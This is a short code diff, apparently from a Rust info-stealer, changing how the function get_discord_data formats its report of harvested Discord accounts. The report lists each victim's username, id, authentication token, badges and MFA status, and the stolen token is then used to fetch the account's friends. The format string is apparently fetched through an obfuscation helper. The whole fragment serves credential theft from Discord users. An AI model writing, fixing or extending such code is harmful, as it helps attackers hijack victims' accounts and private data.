@@ -304,10 +304,17 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
         let acc_badges = badge_emojis(acc.public_flags);
         let acc_badges_str = if acc_badges.is_empty() { "None" } else { &acc_badges.join(" ") };
         let mfa_str = if acc.mfa_enabled { "enabled" } else { "disabled" };
-        discord_content.push_str(&format!(
-            s_discord_report_fmt(),
-            acc.username, acc.id, acc.token, acc_badges_str, mfa_str, "-".repeat(30)
-        ));
+        {
+            let fmt = s_discord_report_fmt();
+            let entry = fmt
+                .replacen("{}", &acc.username, 1)
+                .replacen("{}", &acc.id, 1)
+                .replacen("{}", &acc.token, 1)
+                .replacen("{}", acc_badges_str, 1)
+                .replacen("{}", mfa_str, 1)
+                .replacen("{}", &"-".repeat(30), 1);
+            discord_content.push_str(&entry);
+        }
         summary_description.push_str(&format!("`{}` - {} - MFA: {}\n", acc.username, acc_badges_str, mfa_str));
 
         let friends = fetch_discord_friends(client, &acc.token).await;
